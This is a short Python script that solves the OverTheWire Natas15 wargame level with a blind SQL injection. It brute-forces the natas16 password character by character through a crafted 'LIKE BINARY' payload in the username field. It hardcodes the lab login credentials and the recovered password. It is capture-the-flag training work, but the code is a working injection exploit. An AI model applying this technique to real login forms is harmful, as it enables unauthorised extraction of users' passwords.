# Solve http://natas16.natas.labs.overthewire.org
from requests import request

# Check: Natas16 password is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
def part_16():

    # The password will be empty in the beginning
    password = ""

    # Used for debugging
    # print("Test1:" + password)

    for i in range(32):
        #These are the possible characters for the password
        chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

        for nextchar in chars:

            # This is the URL that is targeted
            url = "http://natas15.natas.labs.overthewire.org/"

            # These are the credentials that will be used to log in
            auth = ("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

            # This will be entered in the input box on the webpage
            payload = 'natas16\" AND password LIKE BINARY \"' + password + nextchar+ '%'

            # This is everything that should be done as soon as the authentication completed
            data = {"username":payload}

            # Execute request
            response = request("POST",url,auth=auth,data=data)

            # If the query goes through successfully, append the correct character
            if b"This user exists." in response.content:
                print("Test successful.")
                password += nextchar
                # Used for debugging
                print(password)
                break
            elif b"This user does" in response.content:
                print("Test failed.")
            else:
                print("Error in query.")
        print("Password found!")
    # Used for debugging
    # print(response.status_code)
    # print(response.content)

part_16()

'''
Help received by Ryan Haley, Li-Wey Lu and Joao Godinho
'''
